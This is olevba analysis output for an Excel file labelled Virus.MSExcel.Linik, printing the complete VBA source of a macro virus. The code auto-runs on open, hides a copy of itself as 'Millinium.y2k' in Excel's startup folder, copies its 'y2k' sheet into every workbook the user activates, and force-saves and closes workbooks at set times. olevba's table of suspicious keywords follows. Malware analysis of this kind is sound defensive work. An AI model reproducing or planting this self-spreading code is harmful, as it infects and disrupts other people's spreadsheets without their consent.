olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Linik-ab8679e71aedcfd1c9512ff78552f9959824922b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO y2k.bas 
in file: Virus.MSExcel.Linik-ab8679e71aedcfd1c9512ff78552f9959824922b - OLE stream: '_VBA_PROJECT_CUR/VBA/y2k'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "CheckSheets"
End Sub

Sub CheckSheets()
Attribute CheckSheets.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.ScreenUpdating = False
    On Error GoTo NoMillinium
    If Windows("Millinium.y2k").Visible = False Then P = 1 Else Windows("Millinium.y2k").Visible = False
    On Error GoTo Noy2k
    If ActiveWorkbook.Sheets("y2k").Visible = False Then X = 1 Else ActiveWorkbook.Sheets("y2k").Visible = False
    WhichSheets = P + X
    Select Case WhichSheets
        Case 2
            If ActiveWorkbook.Saved Then
                Msg = "Do you want to continue ?"
                Style = vbYesNo + vbCritical + vbDefaultButton1
                Title = ""
                Ctxt = 1000
                Response = MsgBox(Msg, Style, Title, Help, Ctxt)
               If Response = vbYes Then ActiveWorkbook.Close
            End If
        End Select
     Workbooks("Millinium.y2k").Save
     Application.OnEntry = "CheckEntrys"
    Exit Sub
NoMillinium:
    Sheets("y2k").Copy
    ActiveWorkbook.SaveAs Filename:=(Application.StartupPath & "\" & "Millinium.y2k"), FileFormat _
        :=xlNormal, Password:="", WriteResPassword:="", _
        ReadOnlyRecommended:=False, CreateBackup:=False
    Windows("Millinium.y2k").Visible = False
    Workbooks("Millinium.y2k").Save
    CheckSheets
    Exit Sub
Noy2k:
    Workbooks("Millinium.y2k").Sheets("y2k").Copy Before:=ActiveWorkbook.Sheets(1)
    CheckSheets
    Exit Sub
End Sub

Sub CheckEntrys()
Attribute CheckEntrys.VB_ProcData.VB_Invoke_Func = " \n14"
    Breakfast1 = TimeValue("7:00:00 AM")
    Breakfast2 = TimeValue("7:15:00 AM")
    Lunch1 = TimeValue("11:45:00 AM")
    Lunch2 = TimeValue("11:59:00 AM")
    Dinner1 = TimeValue("7:00:00 PM")
    Dinner2 = TimeValue("7:15:00 PM")
    CloseTime1 = TimeValue("3:25:00 PM")
    CloseTime2 = TimeValue("3:30:00 PM")
    
    If Time > Breakfast1 Then
        If Time < Breakfast2 Then
        Message = MsgBox("Breakfast Time !!", vbOKOnly)
        ActiveWorkbook.Save
    End If
    End If

    If Time > Lunch1 Then
        If Time < Lunch2 Then
        Message = MsgBox("Lunch Time !!", vbOKOnly)
        ActiveWorkbook.Save
    End If
    End If

    If Time > Dinner1 Then
        If Time < Dinner2 Then
        Message = MsgBox("Dinner Time !!", vbOKOnly)
        ActiveWorkbook.Save
    End If
    End If
    
    If Time > CloseTime1 Then
        If Time < CloseTime2 Then
        Message = MsgBox("Closing Time", vbOKOnly)
        ActiveWorkbook.Save
        ActiveWorkbook.Close
    End If
    End If
End Sub


-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Linik-ab8679e71aedcfd1c9512ff78552f9959824922b - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     11 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  y2
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

